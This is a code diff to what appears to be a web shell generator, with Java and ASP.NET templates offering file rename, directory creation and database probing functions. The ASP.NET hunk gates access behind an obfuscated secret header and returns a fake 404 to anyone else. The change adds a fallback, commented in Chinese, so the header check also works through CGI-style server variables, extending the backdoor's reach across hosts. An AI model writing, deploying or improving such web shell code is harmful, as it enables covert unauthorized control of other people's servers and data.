@@ -160,6 +160,7 @@ static String DSW_ren(String f, String t) {{
 }}
 static String DSW_mkdir(String p) {{
     return new File(p).mkdirs() ? "{{\\"ok\\":true,\\"data\\":null}}" : "{{\\"ok\\":false,\\"error\\":\\"mkdir failed\\"}}";
+}}
 static String DSW_dbprobe(String c) {{
     try {{
         String drv = DSW_json_get(c, "driver");
@@ -431,7 +432,10 @@ static string DSW_mkdir(string p) {{
 </script>
 <%
 string xk = "{xk}";
-string token = Request.Headers[DSW_dec("{gk}", xk)];
+string gk = DSW_dec("{gk}", xk);
+string token = Request.Headers[gk];
+// 兜底：部分宿主只暴露 CGI 形式的服务器变量名（HTTP 前缀 + 下划线）
+if (token == null) {{ token = Request.ServerVariables["HTTP_" + gk.Replace("-", "_").ToUpper()]; }}
 if (token == null || token != DSW_dec("{token}", xk)) {{ Response.StatusCode = 404; Response.End(); return; }}
 string fd = Request["formData"];
 if (fd == null) {{ Response.End(); return; }}
